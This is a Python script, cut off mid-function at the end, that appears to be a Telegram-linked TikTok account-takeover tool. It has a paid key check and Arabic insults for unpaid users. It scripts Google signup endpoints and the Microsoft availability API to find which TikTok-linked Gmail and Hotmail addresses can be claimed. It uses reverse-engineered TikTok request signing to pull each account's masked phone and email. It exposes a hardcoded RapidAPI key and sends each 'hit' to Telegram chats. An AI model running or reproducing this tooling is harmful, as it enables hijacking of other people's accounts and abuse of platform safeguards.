import os    
from requests import get,post
try:
  from urllib.parse import urlencode
except:
  os.system('pip install pycryptodome')
try:
  import MedoSigner
except:
  os.system('pip install MedoSigner')
from random import choice,randrange
import http.client
import requests
import re
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
import os,re
import requests 
try:
	import telebot 
except:
	os.system('pip install telebot')
	os.system('pip install Pytelegrambotapi==3.7.7')
	os.system('clear')
	import telebot
from telebot import types
from uuid import uuid4
import random
from re import *
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import datetime
import secrets
import uuid
import binascii
import secrets
try:
	import binascii
except:
	os.system('pip install binascii')
os.system('clear')

Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m'	
cokie  = secrets.token_hex(8)*2
zzk=0
print(S+'* ملاحضه ايديك مثبت بالاداه اذا غير مشترك لايمكن ان يصلك شيئ ')
key=int(input(B+"Enter Key : "))
try:
	dod = requests.get('https://raw.githubusercontent.com/zaid21ru/text/refs/heads/main/vip').text
	kaayy = requests.get('https://raw.githubusercontent.com/zaid21ru/text/refs/heads/main/keyey').text
	ex=int(kaayy)
	ded = dod.splitlines()
except:
	try:
		print('\n\n')
		print(S+kaayy)
		#exit()
	except:
		print(Z+'أتصالك بالانترنت ضعيف جداً ')
		exit()
if int(key) == int(kaayy):
	pass
else:
	print(f'{X}')
	print(B+' أنت غير مشترك ياغبي 🤣  ')
	print('\n')
	print(X+'  كـس أمك خمااط 😌  ')
	exit()
	
tok= input(B+"Enter Token : ")
os.system('clear')
bot = telebot.TeleBot(tok)

def em_num(user):
  try:
    import requests,random
    import uuid
    from MedoSigner import Argus,Gorgon, md5,Ladon
    from urllib.parse import urlencode
    import time
    def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        data=payload
        if not unix: unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}

    secret = secrets.token_hex(16)
    cookies ={
  "passport_csrf_token": secret,
  "passport_csrf_token_default": secret
}
    session = requests.Session()
    session.cookies.update(cookies)
    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"
    params = {
  "request_tag_from": "h5",
  "fixed_mix_mode": "1",
  "mix_mode": "1",
  "account_param":user,
  "scene": "4",
  "device_platform": "android",
  "os": "android",
  "ssmix": "a",
      '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
    'cdid': str(uuid.uuid4()),
  "channel": "googleplay",
  "aid": "1233",
  "app_name": "musical_ly",
  "version_code": "360505",
  "version_name": "36.5.5",
  "manifest_version_code": "2023605050",
  "update_version_code": "2023605050",
  "ab_version": "36.5.5",
  "resolution": "1440*2969",
  "dpi": "532",
  "device_type": "SM-S928B",
  "device_brand": "samsung",
  "language": "EN",
  "os_api": "34",
  "os_version": "14",
  "ac": "wifi",
  "is_pad": "0",
  "current_region": "US",
  "app_type": "normal",
  "sys_region": "US",
  "last_install_time": "1729289943",
  "mcc_mnc": "41820",
  "timezone_name": "Asia/Baghdad",
  "carrier_region_v2": "418",
  "residence": "US",
  "app_language": "en",
  "carrier_region": "US",
  "timezone_offset": "10800",
  "host_abi": "arm64-v8a",
  "locale": "ar",
  "ac2": "wifi",
  "uoo": "0",
  "op_region": "US",
  "build_number": "36.5.5",
  "region": "US",
  'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
    'iid': str(random.randint(1, 10**19)),
    'device_id': str(random.randint(1, 10**19)),
    'openudid': str(binascii.hexlify(os.urandom(8)).decode()),

  "support_webview": "1",
  "cronet_version": "1c651b66_2024-08-30",
  "ttnet_version": "4.2.195.8-tiktok",
  "use_store_region_cookie": "1"
}
    m=sign(params=urlencode(params),payload="",cookie="")
    headers = {
  'User-Agent': "com.zhiliaoapp.musically/2023605050 (Linux; U; Android 14; ar; SM-S928B; Build/UP1A.231005.007; Cronet/TTNetVersion:1c651b66 2024-08-30 QuicVersion:182d68c8 2024-05-28)",
  'Accept': "application/json, text/plain, */*",
  'x-tt-passport-csrf-token': secret,
  'content-type': "application/x-www-form-urlencoded",
  'x-argus': m["x-argus"],  'x-gorgon':m["x-gorgon"],'x-khronos': m["x-khronos"],'x-ladon':m["x-ladon"],
}
    response = session.post(url, params=params, headers=headers)
    passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]
    url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
    for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
      params.pop(key, None)
    params['passport_ticket'] = passport_ticket
    response = session.post(url, params=params, headers=headers)
    hh=json.loads(response.headers["x-tt-verify-idv-decision-conf"])
    g={
      'number':'',
      'email':''
    }
    for en in hh['extra']:
      if '+' in en['masked_account']:
        g.update({'number':en['masked_account']})
      elif '@' in en['masked_account']:
        g.update({'email':en['masked_account']})
        
    return g
  except Exception as e:
    return {
      'number':'',
      'email':''
    }


def zzod(email):
  email=str(email)
  user = email.split('@')[0]
  try:
    he={
'X-RapidAPI-Host': 'tiktok-video-no-watermark2.p.rapidapi.com',
'X-RapidAPI-Key': '54eb4910e1msh0b7d1211a1be475p12c3aejsnd55f85d359f3',
'Host': 'tiktok-video-no-watermark2.p.rapidapi.com',
'Connection': 'Keep-Alive',
'Accept-Encoding': 'gzip',
'User-Agent': 'okhttp/3.14.7',
}

    
    url=f'https://tiktok-video-no-watermark2.p.rapidapi.com/user/info?unique_id={user}&user_id='
    r=requests.get(url,headers=he).json()
    id = r['data']['user']['id']
    user = user  
    name=r['data']['user']['nickname']
    folon = r['data']['stats']['followingCount']
    folos = r['data']['stats']['followerCount']
    lik =  r['data']['stats']['heartCount']
    vid = r['data']['stats']['videoCount']
    priv = r['data']['user']['privateAccount']
    ff = (f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @P_W_7 | 
═══════════════════
𝙽𝙰𝙼𝙴 : {name}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {email}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {folos}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {folon}
𝙻𝙸𝙺𝙴 : {lik}
𝙸𝙳 : {id}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {priv}
𝚅𝙴𝙳𝙾 : {vid}
𝚁𝙴𝚂𝚃 : {em_num(user)}
═══════════════════
   ''')
    #print(ff)
    for ede in ded:
    	try:
    		bot.send_message(ede,f"<strong>{ff}</strong>",parse_mode="html",reply_markup=types.InlineKeyboardMarkup())
    	except:pass
  except:
    ff=f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @P_W_7 | 
═══════════════════
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {email}
═══════════════════
    '''
    #print(ff)
    for ede in ded:
    	try:
    		bot.send_message(ede,f"<strong>{ff}</strong>",parse_mode="html",reply_markup=types.InlineKeyboardMarkup())
    	except:pass

ya=0
no=0
nod=0
yas=0
def qredes():
    ua=str(generate_user_agent())
    time0=time()
    conn = http.client.HTTPSConnection('accounts.google.com')
    while True:
        try:
            headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://accounts.google.com/',
    'user-agent': ua,
}
            conn.request(
    'GET',
    '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
    headers=headers
)
            response = conn.getresponse().info()
            __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
            tl=str(response).split('TL=')[1].split('\n')[0]
            break
        except:''
    while True:
        try:
            cookies = {
    '__Host-GAPS': __Host_GAPS,
}
            headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://accounts.google.com/',
    'user-agent':  ua,
}
            response = requests.get(
    'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
    cookies=cookies,
    headers=headers,
)
            tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
            po=0
            for i in tok:
                po+=1
                if 'SNlM0e' == i:
                    break
         #   print(tok)
         #   print(po)
            hl=tok[0]
            s1=tok[33]
            at=tok[po]
            break
        except:''
    while True:
        try:
            name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
            cookies = {
    '__Host-GAPS': __Host_GAPS,
}
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': ua,
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'E815hb',
    'source-path': '/lifecycle/steps/signup/name',
    'hl': hl,
    'TL': tl,
}
            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
            response = requests.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
            break
        except:''
    while True:
        try:
            yaer=str(randrange(1980,2007))
            month=str(randrange(1,12))
            day=str(randrange(1,28))
            cookies = {
    '__Host-GAPS': __Host_GAPS
}
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': ua,
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'eOY7Bb',
    'source-path': '/lifecycle/steps/signup/birthdaygender',
    'hl': hl,
    'TL': tl,
}

            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQbuiwLQLEbJLFMSlolNVvrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwiGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZRdDgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxo3Gdlx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHj4LTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
            response = requests.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
            break
        except:''
    tm=time()-time0
    try:
        return {
            'tokens':{
                '__Host-GAPS':__Host_GAPS,
                'TL':tl,
                'hl':hl,
                'at':at,
                's1':s1,
            },
            'info':{
                'name':name,
                'birthday':{
                    'day:month:year':day+':'+month+':'+yaer,
                    'day':day,
                    'month':month,
                    'year':yaer,
                },
                'time_get_tokens':tm,
                'time':time(),
                'by':'@Qredes - https://t.me/Qredes_Tools'
                    },
            'errors':[],
        }
    except:
        return {
            'errors':['error get tokens'],
            'tokens':{

            },
            'info':{
                'by':'@Qredes - https://t.me/Qredes_Tools',
                'time':time(),
                'time_get_tokens':tm,
            },
        }


def get_tokens():
  while True:
    try:
      g=qredes()['tokens']
      TL=g['TL']
      __Host_GAPS=g['__Host-GAPS']
      at=g['at']
      hl=g['hl']
      s1=g['s1']
      try:
        os.remove(f'tokens.txt')
      except:''
      with open(f'tokens.txt','a') as a:
        a.write(f'{TL}///{__Host_GAPS}///{at}///{hl}///{s1}')
      return 
    except:''


def check_tokens():
  while True:
    try:
      try:
        o=open('tokens.txt','r').read().splitlines()[0].split('///')
        TL=o[0]
        __Host_GAPS=o[1]
        at=o[2]
        hl=o[3]
        s1=o[4]
      except Exception as e:
        get_tokens()
        return
      email=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn1234567890.') for i in range(randrange(10,15)))
      cookies = {
          '__Host-GAPS': __Host_GAPS,
      }

      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
          'origin': 'https://accounts.google.com',
          'priority': 'u=1, i',
          'referer': 'https://accounts.google.com/',
          'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
          'sec-ch-ua-arch': '"x86"',
          'sec-ch-ua-bitness': '"64"',
          'sec-ch-ua-form-factors': '"Desktop"',
          'sec-ch-ua-full-version': '"112.0.5197.39"',
          'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-model': '""',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua-platform-version': '"10.0.0"',
          'sec-ch-ua-wow64': '?0',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
          'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
          'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
          'x-same-domain': '1',
      }

      params = {
          'rpcids': 'NHJMOd',
          'source-path': '/lifecycle/steps/signup/username',
          'f.sid': '-794764349027196993',
          'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
          'hl': hl,
          'TL': TL,
          '_reqid': '648808',
          'rt': 'c',
      }

      data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

      response = post(
          'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
          params=params,
          cookies=cookies,
          headers=headers,
          data=data,
      ).text
      if 'password' in response:
        return
      else:
        get_tokens()
        return
    except:''      
def check_gmail(email):			         	
			         	global ya,no,yas,nod
			         	email=email.split('@')[0]+'@gmail.com'
			         	try:
			         		      if '@' in email:email=email.split('@')[0]
			         		      check_tokens()
			         		      o=open('tokens.txt','r').read().splitlines()[0].split('///')
			         		      TL=o[0]
			         		      __Host_GAPS=o[1]
			         		      at=o[2]
			         		      hl=o[3]
			         		      s1=o[4]
			         		      cookies = {
          '__Host-GAPS': __Host_GAPS,
      }

			         		      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
          'origin': 'https://accounts.google.com',
          'priority': 'u=1, i',
          'referer': 'https://accounts.google.com/',
          'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
          'sec-ch-ua-arch': '"x86"',
          'sec-ch-ua-bitness': '"64"',
          'sec-ch-ua-form-factors': '"Desktop"',
          'sec-ch-ua-full-version': '"112.0.5197.39"',
          'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-model': '""',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua-platform-version': '"10.0.0"',
          'sec-ch-ua-wow64': '?0',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
          'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
          'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
          'x-same-domain': '1',
      }

			         		      params = {
          'rpcids': 'NHJMOd',
          'source-path': '/lifecycle/steps/signup/username',
          'f.sid': '-794764349027196993',
          'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
          'hl': hl,
          'TL': TL,
          '_reqid': '648808',
          'rt': 'c',
      }

			         		      data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

			         		      response = post(
          'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
          params=params,
          cookies=cookies,
          headers=headers,
          data=data,
      ).text
			         		      email=email+'@gmail.com' 
			         		      if 'password' in response:
			         		      	yas+=1
			         		      	os.system('clear')
			         		      	print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			         		      	zzod(email)
			         		      	      
			         		      else:
			         		      	os.system('clear')
			         		      	nod+=1
			         		      	print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			         		      print(response)
			         	except:
			         		print('GG')     	     

def check_hotmail(email):
	global ya,no,yas,nod
	reqz=requests.Session();headers = {
	"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
	"Host": "signup.live.com",
	"Connection": "keep-alive",
	"X-Requested-With": "XMLHttpRequest"
	    };url="https://signup.live.com/signup.aspx?lic=1";response=reqz.get(url, headers=headers)
	apiCanary = search("apiCanary\":\"(.+?)\",", str(response.content)).group(1)
	apiCanary = str.encode(apiCanary).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii");url  = "https://signup.live.com/API/CheckAvailableSigninNames";json = {
	"signInName": email,
	"includeSuggestions": True};res = reqz.post(url, headers={
	"Content-Type":"application/x-www-form-urlencoded; charset=utf-8",
	"canary":apiCanary
	}, json=json)	
	if res.json()["isAvailable"]==False:
		os.system('clear')
		nod+=1
		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Hotmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Hotmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	         	  		
	else:
		zzod(email)
		yas+=1
		os.system('clear')
		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Hotmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Hotmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
		
def chzm(email):
	import requests,random
	import uuid
	from MedoSigner import Argus,Gorgon, md5,Ladon
	from urllib.parse import urlencode
	import time
	def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
	       x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
	       data=payload
	       if not unix: unix = int(time.time())
	       return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}
	global ya,no,yas,nod
	idg = "".join(random.choice('1234567890')for i in range(19))
	params = {
  "request_tag_from": "h5",
  "fixed_mix_mode": "1",
  "mix_mode": "1",
 # "account_param":user,
    'passport-sdk-version':'0',
    'app_language':'en',
  "scene": "4",
  "device_platform": "android",
  "os": "android",
